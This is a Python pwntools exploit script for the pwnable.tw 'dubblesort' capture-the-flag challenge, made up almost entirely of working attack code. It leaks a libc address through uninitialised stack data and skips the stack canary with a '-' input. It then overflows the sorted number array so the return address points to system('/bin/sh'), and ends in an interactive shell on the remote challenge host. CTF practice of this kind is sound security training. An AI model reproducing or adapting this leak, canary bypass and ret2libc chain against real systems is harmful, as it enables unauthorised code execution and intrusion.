#!/usr/bin/env python3
from pwn import *

PAD = lambda n: b"a" * n
DWORD = 4

ld = ELF("ld-2.23.so")
elf = ELF("dubblesort_patched")
libc = ELF("./given/libc_32.so.6")

context.arch = elf.arch
context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote("chall.pwnable.tw", 10101)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        with open(f"/proc/{p.pid}/maps", "rb") as f:
            maps = f.read()
            f.close()
        regions = maps.split(b"\n")
        pie_base = None
        for region in regions:
            if b"dubblesort_patched" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        if pie_base is None:
            quit()
        gdb.attach(p, "\n".join([
            f"b *{hex(pie_base + 0xa1d)}", # main after read() name buf
            f"b *{hex(pie_base + 0xab3)}", # main before sort()
            f"b *{hex(pie_base + 0xb0b)}", # main's stack_chk_failed
            f"b *{hex(pie_base + 0xb13)}", # main's ret
        ]))

def leak_libc():
    """
    Use stack leftover to leak libc
    - to debug, use pie_base + 0xa1d to check stack address
    """
    if args.REMOTE:
        offset = 0x1c + 1
    else:
        offset = 0x18 + 1
    p.sendafter(b"What your name :", PAD(offset))
    p.recvuntil(PAD(offset))
    leak = p.recvn(3)
    libc_leak = u32(leak.rjust(DWORD, b"\x00"))
    log.info(f"Libc leak: {hex(libc_leak)}")
    return libc_leak

def bufovfl():

    num_rop_gadgets = 3
    num_to_sort = 0x7c // DWORD + 1 + num_rop_gadgets
    log.info(f"num to sort: {num_to_sort}")
    p.sendlineafter(b"How many numbers do you what to sort :", str(num_to_sort).encode())

    # this attack only works if canary is less than libc address
    canary_index = 24
    ret_index = num_to_sort - num_rop_gadgets
    for i in range(num_to_sort):
        if i < canary_index:
            num = str(0).encode()
        elif i == canary_index:
            num = b"-"
        elif canary_index < i < ret_index:
            num = str(libc.address).encode()
        elif i == ret_index:
            num = str(libc.sym["system"]).encode()
        else:
            num = str(next(libc.search(b"/bin/sh\x00"))).encode()
        p.sendlineafter(f"Enter the {i} number :".encode(),
                        num)


def exploit():
    libc.address = leak_libc() - 0x1b0000
    log.info(f"libc base: {hex(libc.address)}")

    bufovfl()
    p.interactive()

if __name__ == "__main__":
    exploit()
